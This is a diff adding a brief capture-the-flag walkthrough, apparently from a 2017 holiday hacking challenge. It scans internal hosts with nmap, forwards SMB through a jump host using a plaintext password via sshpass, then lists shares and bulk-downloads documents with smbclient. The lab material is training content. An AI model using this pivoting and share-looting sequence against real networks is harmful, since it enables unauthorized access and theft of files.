@@ -1,0 +1,74 @@
+Getting smb files
+
+    bash-4.4$ nmap -sL 10.142.0.1-15
+
+    Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-17 22:16 UTC
+    Nmap scan report for 10.142.0.1
+    Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+    Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+    Nmap scan report for 10.142.0.4
+    Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+    Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+    Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+    Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+    Nmap scan report for 10.142.0.9
+    Nmap scan report for 10.142.0.10
+    Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+    Nmap scan report for 10.142.0.12
+    Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+    Nmap scan report for 10.142.0.14
+    Nmap scan report for 10.142.0.15
+    Nmap done: 15 IP addresses (0 hosts up) scanned in 0.01 seconds
+
+looks like 10.142.0.7 is the fileserver
+
+Forward the port:
+
+    $ sshpass -p stream_unhappy_buy_loss ssh -L 4445:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com
+
+Now list shares using smbclient:
+
+    $ smbclient -L localhost -p 4445 -U alabaster_snowball
+    WARNING: The "syslog" option is deprecated
+    Enter alabaster_snowball's password:
+    Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+
+            Sharename       Type      Comment
+            ---------       ----      -------
+            ADMIN$          Disk      Remote Admin
+            C$              Disk      Default share
+            FileStor        Disk
+            IPC$            IPC       Remote IPC
+    Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
+    NetBIOS over TCP disabled -- no workgroup available
+
+Connect:
+
+    $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
+    WARNING: The "syslog" option is deprecated
+    Enter alabaster_snowball's password:
+    Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+    smb: \> ls
+      .                                   D        0  Wed Dec  6 16:51:46 2017
+      ..                                  D        0  Wed Dec  6 16:51:46 2017
+      BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
+      GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
+      MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017
+      MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
+      Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
+      Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017
+
+                    13106687 blocks of size 4096. 9624115 blocks available
+    smb: \> mget *
+    Get file BOLO - Munchkin Mole Report.docx? y
+    getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (1094.4 KiloBytes/sec) (average 1094.4 KiloBytes/sec)
+    Get file GreatBookPage3.pdf? y
+    getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2818.7 KiloBytes/sec) (average 2231.9 KiloBytes/sec)
+    Get file MEMO - Calculator Access for Wunorse.docx? y
+    getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (666.0 KiloBytes/sec) (average 1924.0 KiloBytes/sec)
+    Get file MEMO - Password Policy Reminder.docx? y
+    getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (834.4 KiloBytes/sec) (average 1752.3 KiloBytes/sec)
+    Get file Naughty and Nice List.csv? y
+    getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (99.1 KiloBytes/sec) (average 1599.3 KiloBytes/sec)
+    Get file Naughty and Nice List.docx? y
+    getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (390.3 KiloBytes/sec) (average 1452.3 KiloBytes/sec)
